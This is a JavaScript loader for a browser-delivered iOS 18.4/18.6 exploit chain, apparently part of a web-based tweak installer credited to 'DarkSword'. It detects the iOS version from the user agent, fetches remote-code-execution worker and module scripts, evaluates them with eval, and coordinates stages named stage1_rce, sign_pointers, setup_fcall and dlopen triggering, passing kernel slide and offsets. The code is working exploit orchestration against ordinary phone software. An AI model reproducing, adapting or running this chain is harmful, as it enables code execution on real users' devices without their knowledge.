var SERVER_LOG = false;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
try { sessionStorage.setItem('ls_running', '1'); sessionStorage.setItem('localSession', '1'); } catch(e) {}
// Parse the iframe's ?tweaks=... and ?level=... query params using
// URLSearchParams so URL-encoded characters (notably the comma between
// tweak names becoming %2C) are decoded correctly. The previous regex
// approach silently dropped any tweak that came after a %2C because the
// character class did not include %, so checking both fiveicon and
// powercuff in the picker would only propagate fiveicon.
try {
    var __lsParams = new URLSearchParams(location.search || '');
    var __validTweaks = { fiveicon: 1, powercuff: 1, mgpatcher: 1, applimit: 1, statbar: 1, speedster: 1 };
    var __tweaksList = [];
    var __rawTweaks = __lsParams.get('tweaks') || __lsParams.get('tweak') || '';
    if (__rawTweaks) {
        var __parts = String(__rawTweaks).split(',');
        for (var __i = 0; __i < __parts.length; __i++) {
            var __t = (__parts[__i] || '').toLowerCase().trim();
            if (__validTweaks[__t] && __tweaksList.indexOf(__t) < 0) __tweaksList.push(__t);
        }
    }
    var __otaOnly = ((__lsParams.get('export_ota_disabled') || '').toLowerCase().trim() === '1' || (__lsParams.get('export_ota_disabled') || '').toLowerCase().trim() === 'true');
    if (__tweaksList.length === 0) __tweaksList.push(__otaOnly ? 'none' : 'fiveicon');
    globalThis.__ls_tweaks = __tweaksList.join(',');
} catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
try {
    var __lsParams2 = new URLSearchParams(location.search || '');
    var __validLevels = { off: 1, nominal: 1, light: 1, moderate: 1, heavy: 1 };
    var __lvl = (__lsParams2.get('level') || 'heavy').toLowerCase().trim();
    globalThis.__ls_powercuff_level = __validLevels[__lvl] ? __lvl : 'heavy';
} catch (e) { globalThis.__ls_powercuff_level = 'heavy'; }
try {
    var __lsParams3 = new URLSearchParams(location.search || '');
    function __sbcLsClamp(raw, lo, hi, def) {
        var n = parseInt(raw, 10);
        if (!isFinite(n)) return def;
        if (n < lo) return lo;
        if (n > hi) return hi;
        return n;
    }
    globalThis.__ls_sbc_dock_icons = __sbcLsClamp(__lsParams3.get('dock_icons'), 4, 7, 4);
    globalThis.__ls_sbc_hs_cols = __sbcLsClamp(__lsParams3.get('hs_cols'), 3, 7, 4);
    globalThis.__ls_sbc_hs_rows = __sbcLsClamp(__lsParams3.get('hs_rows'), 4, 8, 6);
    globalThis.__ls_sbc_statbar = (__lsParams3.get('statbar') === '1') ? 1 : 0;
    globalThis.__ls_sbc_statbar_celsius = (__lsParams3.get('statbar_celsius') === '1') ? 1 : 0;
    globalThis.__ls_sbc_statbar_hide_net = (__lsParams3.get('statbar_hide_net') === '1') ? 1 : 0;
    globalThis.__ls_sbc_hide_labels = (__lsParams3.get('hide_labels') === '1') ? 1 : 0;
    globalThis.__ls_sbc_speedster_jitter = (__lsParams3.get('speedster_jitter') === '1') ? 1 : 0;
    globalThis.__ls_sbc_speedster_wake = (__lsParams3.get('speedster_wake') === '1') ? 1 : 0;
    globalThis.__ls_mg_flags = (__lsParams3.get('mg_flags') || '');
    globalThis.__ls_mg_unflags = (__lsParams3.get('mg_unflags') || '');
} catch (e) {
    globalThis.__ls_sbc_dock_icons = 4;
    globalThis.__ls_sbc_hs_cols = 4;
    globalThis.__ls_sbc_hs_rows = 6;
    globalThis.__ls_sbc_statbar = 0;
    globalThis.__ls_sbc_statbar_celsius = 0;
    globalThis.__ls_sbc_statbar_hide_net = 0;
    globalThis.__ls_sbc_hide_labels = 0;
    globalThis.__ls_sbc_speedster_jitter = 0;
    globalThis.__ls_sbc_speedster_wake = 0;
    globalThis.__ls_mgpatcher_mode = 'enable';
}
try {
    var __lsParams4 = new URLSearchParams(location.search || '');
    var __sbx0FallbackStart = parseInt(__lsParams4.get('sbx0_fallback_start'), 10);
    if (!isFinite(__sbx0FallbackStart)) __sbx0FallbackStart = 0;
    __sbx0FallbackStart %= 4;
    if (__sbx0FallbackStart < 0) __sbx0FallbackStart += 4;
    globalThis.__ls_sbx0_fallback_start = __sbx0FallbackStart;
} catch (e) { globalThis.__ls_sbx0_fallback_start = 0; }
try {
    var __lsParams5 = new URLSearchParams(location.search || '');
    var __mode = (__lsParams5.get('mode') || 'install').toLowerCase().trim();
    globalThis.__ls_run_mode = (__mode === 'cleanup') ? 'cleanup' : 'install';
} catch (e) { globalThis.__ls_run_mode = 'install'; }
try {
    var __lsParams6 = new URLSearchParams(location.search || '');
    var __otaExport = (__lsParams6.get('export_ota_disabled') || '').toLowerCase().trim();
    globalThis.__ls_export_ota_disabled = (__otaExport === '1' || __otaExport === 'true');
} catch (e) { globalThis.__ls_export_ota_disabled = false; }
var basePrefix = location.pathname.replace(/\/[^\/]*$/, '');
if (!basePrefix && location.pathname && location.pathname !== '/' && location.pathname.indexOf('.') < 0) basePrefix = location.pathname;
var localHost = location.origin + basePrefix;
try {
    globalThis.__ls_site_origin = location.origin || "";
    globalThis.__ls_site_host = location.hostname || "";
    globalThis.__ls_site_path = basePrefix || "/";
} catch (e) {
    globalThis.__ls_site_origin = "";
    globalThis.__ls_site_host = "";
    globalThis.__ls_site_path = "/";
}
var __ls_terminal_sent = false;
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    console.log(out);
    try {
        window.parent.postMessage({
            type: 'lightsaber_log',
            text: out,
            source: 'webcontent',
            reportError: !!reportError,
            dumphex: !!dumphex
        }, '*');
    } catch (e) {}
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    };
    if (dumphex) {
        obj.hex = 1;
        obj.text = x;
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    try {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", localHost + "/log?" + req, false);
        xhr.send(null);
    } catch (e) {
        console.error("log send failed:", e);
    }
}
function redirect()
{
    if (__ls_terminal_sent) return;
    __ls_terminal_sent = true;
    try { sessionStorage.removeItem('ls_running'); } catch(e) {}
    // Use '*' as targetOrigin to match upstream DarkSword. location.origin
    // would silently drop the message if the iframe's computed origin
    // doesn't exactly match the parent's (bfcache restore, scheme/port
    // mismatch, etc.) - we'd rather always deliver the done signal than
    // sometimes leave the parent waiting on its 60s setTimeout fallback.
    try { window.parent.postMessage({ type: 'lightsaber_done' }, '*'); } catch (e) {}
}
function fail(reason)
{
    if (__ls_terminal_sent) return;
    __ls_terminal_sent = true;
    let text = reason ? String(reason) : 'Unknown loader failure';
    print("FAIL: " + text, true);
    try { sessionStorage.removeItem('ls_running'); } catch(e) {}
    try { window.parent.postMessage({ type: 'lightsaber_failed', reason: text }, '*'); } catch (e) {}
}
function getJS(fname,method = 'GET')
{
    try
    {
        let url = fname;
        let shortName = url.replace(/\?.*$/, '').replace(/^.*\//, '');
        print("Fetching " + shortName + "...");
        let t0 = Date.now();
        let xhr = new XMLHttpRequest();
        xhr.open(method, `${url}` , false);
        xhr.setRequestHeader("Cache-Control", "no-cache");
        xhr.setRequestHeader("Pragma", "no-cache");
        xhr.send(null);
        let elapsed = Date.now() - t0;
        if (xhr.status < 200 || xhr.status >= 300) {
            throw new Error("HTTP " + xhr.status + " for " + url);
        }
        let size = xhr.responseText ? xhr.responseText.length : 0;
        print("Loaded " + shortName + " (" + size + " bytes, " + elapsed + "ms)");
        return xhr.responseText;
    }
    catch(e)
    {
        print("Fetch failed: " + e, true);
        return null;
    }
}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);
const ios_version = (function() {
    print("UserAgent: " + navigator.userAgent);
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (version) {
        let parsed = version.split('_').map(part => parseInt(part));
        print("Detected iOS version: " + parsed.join('.') + " (raw: " + version + ")");
        return parsed;
    }
    print("WARNING: Could not detect iOS version from UA!");
    return null;
})();
print("Tweak selection: mode=" + (globalThis.__ls_run_mode || 'install') + " tweaks=" + (globalThis.__ls_tweaks || '(none)') + " level=" + (globalThis.__ls_powercuff_level || '(none)') + " sbc=" + globalThis.__ls_sbc_dock_icons + "/" + globalThis.__ls_sbc_hs_cols + "x" + globalThis.__ls_sbc_hs_rows + " rawSearch=" + (location.search || '(empty)'));
print("Loading worker code...");
let workerCode = "";
if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
    print("Using worker for iOS 18.6.x");
    workerCode = getJS(`rce_worker_18.6.js?${Date.now()}`); // local version
    if (!workerCode || !workerCode.trim()) {
        workerCode = getJS(`rce_worker.js?${Date.now()}`);
    }
} else {
    print("Using worker for iOS 18.4.x");
    workerCode = getJS(`rce_worker.js?${Date.now()}`); // local version
}
if (!workerCode || !workerCode.trim()) {
    throw new Error("worker code load failed");
}
print("Worker code loaded: " + (workerCode ? workerCode.length + " bytes" : "FAILED (null/empty)"));
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        print("=== main() started ===");
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        print("Origin: " + origin);
        const worker = new Worker(workerBlobUrl);
        worker.onerror = function(e) {
            const msg = (e.message || e) + " at " + (e.filename || '?') + ":" + (e.lineno || '?');
            print("WORKER ERROR: " + msg, true);
            fail("Worker error: " + msg);
        };
        print("Worker created");
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        if (data.type !== 'log') print("[MSG] " + data.type);
        switch (data.type) {
            case 'redirect':
            {
                print("[MSG] Redirecting...");
                doRedirect();
                break;
            }
            case 'prepare_dlopen_workers':
            {
                print("[MSG] Preparing dlopen workers...");
                await prepare_dlopen_workers();
                print("[MSG] dlopen workers prepared, notifying worker");
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                print("[MSG] trigger_dlopen1");
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                print("[MSG] trigger_dlopen2");
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                print("[MSG] sign_pointers");
                iframe.contentDocument.write('1');
	                worker.postMessage({
	                type: 'setup_fcall',
	                ls_run_mode: globalThis.__ls_run_mode || 'install',
		                ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
		                ls_export_ota_disabled: globalThis.__ls_export_ota_disabled === true,
                ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy',
                ls_sbc_dock_icons: globalThis.__ls_sbc_dock_icons,
                ls_sbc_hs_cols: globalThis.__ls_sbc_hs_cols,
                ls_sbc_hs_rows: globalThis.__ls_sbc_hs_rows,
                ls_sbc_statbar: globalThis.__ls_sbc_statbar,
                ls_sbc_statbar_celsius: globalThis.__ls_sbc_statbar_celsius,
                ls_sbc_statbar_hide_net: globalThis.__ls_sbc_statbar_hide_net,
                ls_sbc_hide_labels: globalThis.__ls_sbc_hide_labels,
                ls_sbc_speedster_jitter: globalThis.__ls_sbc_speedster_jitter,
                ls_sbc_speedster_wake: globalThis.__ls_sbc_speedster_wake,
                ls_mg_flags: globalThis.__ls_mg_flags || '',
                ls_mg_unflags: globalThis.__ls_mg_unflags || '',
                ls_site_origin: globalThis.__ls_site_origin || "",
                ls_site_host: globalThis.__ls_site_host || "",
                ls_site_path: globalThis.__ls_site_path || "/"
                });
                break;
            }
            case 'slow_fcall':
            {
                print("[MSG] slow_fcall");
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            case 'token':
            {
                const token = (data.token || "").toString();
                if (token.length > 0) {
                    try { sessionStorage.setItem('lightsaber_token', token); } catch (e) {}
                    try { window.parent.postMessage({ type: 'lightsaber_token', token: token }, '*'); } catch (e) {}
                }
                break;
            }
            case 'log':
            {
                if (data.text) {
                    try {
                        window.parent.postMessage({
                            type: 'lightsaber_log',
                            text: data.text,
                            source: 'worker',
                            reportError: !!data.reportError,
                            dumphex: !!data.dumphex
                        }, '*');
                    } catch(e) {}
                }
                break;
            }
            case 'stage1_failed':
            {
                fail("Stage1 failed: " + (data.error || "unknown error"));
                break;
            }
            default:
            {
                print("[MSG] Unknown message type: " + data.type);
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        let rceCode = "";
        if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2') {
                rceCode = getJS(`rce_module_18.6.js?${Date.now()}`); // local version
            } else {
                rceCode = getJS(`rce_module.js?${Date.now()}`); // local version
            }
        if (!rceCode || !rceCode.trim()) {
            print("RCE module load failed", true);
        }
        try
        {
            print("Evaluating RCE module...");
            let t0 = Date.now();
            eval(rceCode);
            print("RCE module ready (" + (Date.now() - t0) + "ms)");
        }
        catch(e)
        {
            print("Got exception while running rce: " + e, true);
        }
        let desiredHost = "";
        desiredHost = localHost;
        print("desiredHost = " + desiredHost);
            if(ios_version == '18,6' || ios_version == '18,6,1' || ios_version == '18,6,2')
            {
                print("Sending stage1_rce to worker (iOS 18.6 path) tweaks=" + (globalThis.__ls_tweaks || 'fiveicon') + " level=" + (globalThis.__ls_powercuff_level || 'heavy') + " sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
	                    randomValues,
	                    SERVER_LOG,
	                    ls_run_mode: globalThis.__ls_run_mode || 'install',
	                    ls_tweaks: globalThis.__ls_tweaks || 'fiveicon',
	                    ls_export_ota_disabled: globalThis.__ls_export_ota_disabled === true,
                    ls_powercuff_level: globalThis.__ls_powercuff_level || 'heavy',
                    ls_sbc_dock_icons: globalThis.__ls_sbc_dock_icons,
                    ls_sbc_hs_cols: globalThis.__ls_sbc_hs_cols,
                    ls_sbc_hs_rows: globalThis.__ls_sbc_hs_rows,
                    ls_sbc_statbar: globalThis.__ls_sbc_statbar,
                    ls_sbc_statbar_celsius: globalThis.__ls_sbc_statbar_celsius,
                    ls_sbc_statbar_hide_net: globalThis.__ls_sbc_statbar_hide_net,
                    ls_sbc_hide_labels: globalThis.__ls_sbc_hide_labels,
                    ls_sbc_speedster_jitter: globalThis.__ls_sbc_speedster_jitter,
                    ls_sbc_speedster_wake: globalThis.__ls_sbc_speedster_wake,
                    ls_mgpatcher_mode: globalThis.__ls_mgpatcher_mode || 'enable',
                    ls_mg_flags: globalThis.__ls_mg_flags || '',
                    ls_mg_unflags: globalThis.__ls_mg_unflags || '',
                    ls_site_origin: globalThis.__ls_site_origin || "",
                    ls_site_host: globalThis.__ls_site_host || "",
                    ls_site_path: globalThis.__ls_site_path || "/",
                    sbx0_fallback_start: globalThis.__ls_sbx0_fallback_start || 0
                });
            }
            else
            {
                print("Starting check_attempt (iOS 18.4 path), sbx0FallbackStart=" + (globalThis.__ls_sbx0_fallback_start || 0));
        var attempt = new check_attempt();
        (async function() {
            var maxRetries = 5;
            for (var retryIdx = 0; retryIdx < maxRetries; retryIdx++) {
                if (retryIdx > 0) {
                    print("check_attempt retry " + retryIdx + "/" + maxRetries);
                    await new Promise(function(r) { setTimeout(r, 100); });
                }
                var result = false;
                try { result = await attempt.start(); } catch(e) { print("check_attempt threw: " + e); }
                if (result) {
                    worker.postMessage({
                        type: 'stage1',
                        begin,
                        origin,
                        ios_version,
                        offsets,
                        slide,
                        chipset,
                        device_model,
                        desiredHost,
                        SERVER_LOG,
                        sbx0_fallback_start: globalThis.__ls_sbx0_fallback_start || 0
                    });
                    return;
                }
            }
            print("All " + maxRetries + " check_attempt retries exhausted", true);
            fail("All " + maxRetries + " check_attempt retries exhausted");
        })();
            }
        }
        catch(e)
        {
            print("Got exception on something: " + e, true);
            fail("Loader exception: " + e);
        }
    }
    main();
  })();
